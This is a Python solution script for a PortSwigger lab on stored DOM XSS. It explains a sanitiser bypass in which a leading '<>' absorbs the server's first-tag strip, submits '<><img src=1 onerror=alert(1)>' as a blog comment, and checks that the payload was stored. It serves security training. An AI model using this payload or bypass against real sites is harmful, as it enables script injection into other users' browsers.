# Lab 13 — Stored DOM XSS
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored
#
# Vulnerability: Blog comments — client-side JS renders stored comments via innerHTML
# Aim:           Submit a comment that calls alert when the post is viewed
#
# Technique:
#   The page fetches comments as JSON and writes them to the DOM:
#     commentDiv.innerHTML = comment.body;
#
#   The server's sanitiser strips the first recognised tag — the <> prefix
#   provides a dummy "tag" to absorb the strip, letting the real payload through:
#     <><img src=1 onerror=alert(1)>
#
#   When innerHTML is assigned, the img tag is re-parsed → onerror fires.
#   This is a mini mutation XSS: the stored content looks sanitised but
#   becomes dangerous when re-parsed by the browser's HTML engine.
#
# Usage: python xss_lab13.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, post_comment, verify_stored

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = "<><img src=1 onerror=alert(1)>"
POST_ID = 1

if __name__ == "__main__":
    banner()
    section("LAB 13 — STORED DOM XSS")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab13.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    print(f"  ➜  Posting comment with payload: {PAYLOAD}\n")
    r = post_comment(session, url, POST_ID, PAYLOAD)

    if r is None:
        print("  ✘  Comment submission failed")
        sys.exit(1)

    print(f"  ✔  Comment submitted (status {r.status_code})")
    print(f"  ➜  Verifying payload stored in post {POST_ID}...\n")
    verify_stored(session, url, POST_ID, PAYLOAD, "Stored DOM XSS payload")

    print()
    print("  ➜  Open the post in a browser — onerror fires when innerHTML is set:")
    print(f"     {url}/post?postId={POST_ID}")
    print("  ℹ  <> absorbs the server sanitiser's first-tag removal.")
